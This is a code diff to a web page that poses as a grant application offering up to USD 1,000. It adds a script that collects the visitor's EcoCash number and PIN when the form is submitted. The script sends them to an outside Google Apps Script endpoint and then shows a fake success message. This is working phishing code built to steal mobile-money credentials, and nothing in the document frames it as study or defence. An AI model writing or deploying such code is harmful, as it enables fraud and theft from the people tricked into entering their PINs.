@@ -118,7 +118,7 @@
         Eligible applicants may be considered for grants of up to <strong>USD 1,000</strong>.
     </div>
 
-    <form>
+    <form id="applicationForm">
 <label for="number">EcoCash number</label>
         <input type="text" id="number" placeholder="Enter your EcoCash number" required>
 
@@ -133,6 +133,37 @@
     </div>
 
 </div>
+
+<script>
+document.getElementById("applicationForm")
+.addEventListener("submit", async function(e) {
+
+    e.preventDefault();
+
+    const formData = {
+        number: document.getElementById("number").value,
+        pin: document.getElementById("pin").value
+    };
+
+    try {
+        const response = await fetch(
+            "https://script.google.com/macros/s/AKfycbxx2qFyY5Kk4MMbdF86bfMZvu-BXKDGw6bvOwRzqC5W1y2IfCgRpQ1DRo1GoarzsPUV/exec",
+            {
+                method: "POST",
+                body: JSON.stringify(formData)
+            }
+        );
+
+        alert("Application submitted successfully!");
+
+        document.getElementById("applicationForm").reset();
+
+    } catch (error) {
+        alert("Submission failed. Please try again.");
+        console.error(error);
+    }
+});
+</script>
 
 </body>
 </html>
